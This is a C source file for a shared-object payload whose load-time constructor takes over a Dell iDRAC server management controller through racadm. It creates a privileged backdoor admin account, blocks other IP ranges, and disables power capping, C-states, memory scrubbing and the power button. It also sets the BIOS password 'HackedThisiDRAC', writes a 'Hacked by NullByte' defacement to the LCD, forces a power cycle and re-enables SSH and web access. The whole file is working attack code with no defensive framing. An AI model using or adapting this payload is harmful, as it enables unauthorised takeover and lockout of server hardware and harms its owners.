#include <unistd.h>
#include <stdio.h>

#define EXEC_CMD(program, ...)                                   \
    do                                                           \
    {                                                            \
        int pid = fork();                                        \
        if (!pid)                                                \
        {                                                        \
            execlp(program, program, __VA_ARGS__, (char *)NULL); \
            _exit(1);                                            \
        }                                                        \
        else if (pid > 0)                                        \
        {                                                        \
            waitpid(pid, NULL, 0);                               \
        }                                                        \
    } while (0)

static void main(void) __attribute__((constructor));
static void main(void)
{
    // User admin configuration
    EXEC_CMD("racadm", "config", "-g", "cfgUserAdmin", "-i", "10", "-o", "cfgUserAdminUserName", "{username}");
    EXEC_CMD("racadm", "config", "-g", "cfgUserAdmin", "-i", "10", "-o", "cfgUserAdminPassword", "{password}");
    EXEC_CMD("racadm", "config", "-g", "cfgUserAdmin", "-i", "10", "-o", "cfgUserAdminPrivilege", "{privilege}");
    EXEC_CMD("racadm", "config", "-g", "cfgUserAdmin", "-i", "10", "-o", "cfgUserAdminEnable", "1");

    // Run enterprise script
    EXEC_CMD("sh", "/avct/sbin/enterprise.sh");

    // iDRAC settings

    EXEC_CMD("racadm", "set", "iDRAC.IPBlocking.RangeAddr", "x.x.x.x");
    EXEC_CMD("racadm", "set", "iDRAC.IPBlocking.RangeMask", "255.255.0.0");
    EXEC_CMD("racadm", "set", "iDRAC.IPBlocking.RangeEnable", "1");
    EXEC_CMD("racadm", "set", "iDRAC.IPBlocking.BlockEnable", "1");

    // BIOS and power settings
    EXEC_CMD("racadm", "set", "BIOS.SysProfileSettings.SysProfile", "Custom");
    EXEC_CMD("racadm", "set", "BIOS.SysProfileSettings.EnergyPerformanceBias", "MaxPower");
    EXEC_CMD("racadm", "set", "System.Power.Cap.Enable", "Disabled");
    EXEC_CMD("racadm", "set", "System.Power.Hotspare.Enable", "Disabled");
    EXEC_CMD("racadm", "set", "BIOS.ProcSettings.ControlledTurbo", "Enabled");
    EXEC_CMD("racadm", "set", "BIOS.SysProfileSettings.UncoreFrequency", "MaxUFS");
    EXEC_CMD("racadm", "set", "BIOS.SysProfileSettings.MemFrequency", "MaxPerf");
    EXEC_CMD("racadm", "set", "BIOS.SysProfileSettings.MemPatrolScrub", "Disabled");
    EXEC_CMD("racadm", "set", "BIOS.ProcSettings.DynamicCoreAllocation", "Disabled");
    EXEC_CMD("racadm", "set", "BIOS.SysProfileSettings.ProcCStates", "Disabled");
    EXEC_CMD("racadm", "set", "BIOS.SysProfileSettings.ProcC1E", "Disabled");
    EXEC_CMD("racadm", "set", "BIOS.SysProfileSettings.MonitorMwait", "Disabled");

    // Thermal and security settings
    EXEC_CMD("racadm", "set", "System.ThermalSettings.FanSpeedOffset", "1");
    EXEC_CMD("racadm", "set", "BIOS.SysSecurity.PwrButton", "Disabled");
    EXEC_CMD("racadm", "set", "BIOS.SysSecurity.SetupPassword", "HackedThisiDRAC");

    // LCD settings
    EXEC_CMD("racadm", "set", "System.LCD.Configuration", "0");
    EXEC_CMD("racadm", "set", "System.LCD.UserDefinedString", "Hacked by NullByte :3     Contact: me@nullbyte.rip");

    // Job queue
    EXEC_CMD("racadm", "jobqueue", "create", "BIOS.Setup.1-1", "-r", "pwrcycle", "-s", "TIME_NOW");

    // At the end because resets payload
    EXEC_CMD("racadm", "set", "iDRAC.SSH.Enable", "1");
    EXEC_CMD("racadm", "set", "iDRAC.WebServer.Enable", "1");
}